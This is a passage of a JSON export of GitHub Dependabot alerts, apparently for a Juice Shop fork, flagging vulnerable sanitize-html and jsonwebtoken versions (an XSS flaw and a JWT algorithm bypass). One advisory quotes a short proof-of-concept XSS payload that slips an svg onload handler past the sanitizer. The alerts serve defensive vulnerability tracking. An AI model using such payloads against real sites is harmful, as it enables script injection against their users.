          "name": "sanitize-html"
        },
        "severity": "medium",
        "vulnerable_version_range": "< 1.4.3",
        "first_patched_version": {
          "identifier": "1.4.3"
        }
      },
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/dependabot/alerts/3",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/dependabot/3",
      "created_at": "2025-06-11T06:30:57Z",
      "updated_at": "2025-06-11T06:30:57Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": null
    },
    {
      "number": 2,
      "state": "open",
      "dependency": {
        "package": {
          "ecosystem": "npm",
          "name": "sanitize-html"
        },
        "manifest_path": "package.json",
        "scope": "runtime",
        "relationship": "direct"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-xc6g-ggrc-qq4r",
        "cve_id": "CVE-2017-16016",
        "summary": "Cross-Site Scripting in sanitize-html",
        "description": "Affected versions of `sanitize-html` are vulnerable to cross-site scripting when allowedTags includes at least one `nonTextTag`.\n\n## Proof of Concept\n\n```js\nvar sanitizeHtml = require('sanitize-html');\n\nvar dirty = '!<textarea>&lt;/textarea&gt;<svg/onload=prompt`xs`&gt;</textarea>!';\nvar clean = sanitizeHtml(dirty, {\n    allowedTags: [ 'textarea' ]\n});\n\nconsole.log(clean);\n\n// !<textarea></textarea><svg/onload=prompt`xs`></textarea>!\n```\n\n\n## Recommendation\n\nUpdate to version 1.11.4 or later.",
        "severity": "medium",
        "identifiers": [
          {
            "value": "GHSA-xc6g-ggrc-qq4r",
            "type": "GHSA"
          },
          {
            "value": "CVE-2017-16016",
            "type": "CVE"
          }
        ],
        "references": [
          {
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2017-16016"
          },
          {
            "url": "https://github.com/punkave/sanitize-html/issues/100"
          },
          {
            "url": "https://github.com/punkave/sanitize-html/commit/5d205a1005ba0df80e21d8c64a15bb3accdb2403)))"
          },
          {
            "url": "https://github.com/advisories/GHSA-xc6g-ggrc-qq4r"
          },
          {
            "url": "https://npmjs.com/package/sanitize-html#discarding-the-entire-contents-of-a-disallowed-tag"
          },
          {
            "url": "https://www.npmjs.com/advisories/154"
          },
          {
            "url": "https://github.com/punkave/sanitize-html/commit/5d205a1005ba0df80e21d8c64a15bb3accdb2403"
          }
        ],
        "published_at": "2018-11-09T17:47:23Z",
        "updated_at": "2023-09-08T23:04:55Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "npm",
              "name": "sanitize-html"
            },
            "severity": "medium",
            "vulnerable_version_range": "<= 1.11.1",
            "first_patched_version": {
              "identifier": "1.11.4"
            }
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": null,
            "score": 0.0
          },
          "cvss_v4": {
            "vector_string": null,
            "score": 0.0
          }
        },
        "epss": {
          "percentage": 0.00286,
          "percentile": 0.51619
        },
        "cvss": {
          "vector_string": null,
          "score": 0.0
        },
        "cwes": [
          {
            "cwe_id": "CWE-79",
            "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "npm",
          "name": "sanitize-html"
        },
        "severity": "medium",
        "vulnerable_version_range": "<= 1.11.1",
        "first_patched_version": {
          "identifier": "1.11.4"
        }
      },
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/dependabot/alerts/2",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/dependabot/2",
      "created_at": "2025-06-11T06:30:57Z",
      "updated_at": "2025-06-11T06:30:57Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": null
    },
    {
      "number": 1,
      "state": "open",
      "dependency": {
        "package": {
          "ecosystem": "npm",
          "name": "jsonwebtoken"
        },
        "manifest_path": "package.json",
        "scope": "runtime",
        "relationship": "direct"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-c7hr-j4mj-j2w6",
        "cve_id": "CVE-2015-9235",
        "summary": "Verification Bypass in jsonwebtoken",
        "description": "Versions 4.2.1 and earlier of `jsonwebtoken` are affected by a verification bypass vulnerability. This is a result of weak validation of the JWT algorithm type, occuring when an attacker is allowed to arbitrarily specify the JWT algorithm.\n\n\n\n\n## Recommendation\n\nUpdate to version 4.2.2 or later.",
        "severity": "critical",
        "identifiers": [
          {
            "value": "GHSA-c7hr-j4mj-j2w6",
            "type": "GHSA"
          },
          {
            "value": "CVE-2015-9235",
            "type": "CVE"
          }
        ],
        "references": [
          {
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2015-9235"
          },
          {
            "url": "https://github.com/auth0/node-jsonwebtoken/commit/1bb584bc382295eeb7ee8c4452a673a77a68b687"
          },
          {
            "url": "https://auth0.com/blog/2015/03/31/critical-vulnerabilities-in-json-web-token-libraries/"
          },
          {
            "url": "https://github.com/advisories/GHSA-c7hr-j4mj-j2w6"
          },
          {
            "url": "https://www.npmjs.com/advisories/17"
          },
          {
            "url": "https://www.timmclean.net/2015/02/25/jwt-alg-none.html"
          }
        ],
        "published_at": "2018-10-09T00:38:30Z",
        "updated_at": "2023-01-09T05:02:50Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "npm",
              "name": "jsonwebtoken"
            },
            "severity": "critical",
            "vulnerable_version_range": "< 4.2.2",
            "first_patched_version": {
              "identifier": "4.2.2"
            }
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": null,
            "score": 0.0
          },
          "cvss_v4": {
            "vector_string": null,
            "score": 0.0
          }
        },
        "epss": {
          "percentage": 0.41149,
          "percentile": 0.97212
        },
        "cvss": {
          "vector_string": null,
          "score": 0.0
        },
        "cwes": [
          {
            "cwe_id": "CWE-20",
            "name": "Improper Input Validation"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "npm",
          "name": "jsonwebtoken"
        },
        "severity": "critical",
        "vulnerable_version_range": "< 4.2.2",
        "first_patched_version": {
          "identifier": "4.2.2"
        }
      },
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/dependabot/alerts/1",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/dependabot/1",
      "created_at": "2025-06-11T06:30:57Z",
      "updated_at": "2025-06-11T06:30:57Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": null
    }
  ]
}
